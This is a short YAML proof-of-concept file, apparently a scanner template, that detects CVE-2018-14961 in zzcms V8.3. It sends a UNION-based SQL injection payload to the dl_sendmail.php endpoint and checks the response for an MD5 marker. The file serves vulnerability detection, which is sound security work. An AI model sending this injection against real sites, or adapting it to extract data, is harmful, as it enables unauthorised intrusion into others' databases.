name: poc-yaml-zzcms-cve-2018-14961
set:
  r: randomInt(800000000, 1000000000)
rules:
  - method: POST
    path: >-
      /zzcms8.3/dl/dl_sendmail.php
    body: |
      { 'sql':'select email from zzcms_dl where id=-1 union select md5({{r}}) #'}
    follow_redirects: true
    expression: |
      response.body.bcontains(bytes(md5(string(r))))
detail:
  author: hanxiansheng26(https://github.com/hanxiansheng26)
  Affected Version: "zzcms V8.3"
  links:
    - https://www.jiangjunzy.com/post-5773.html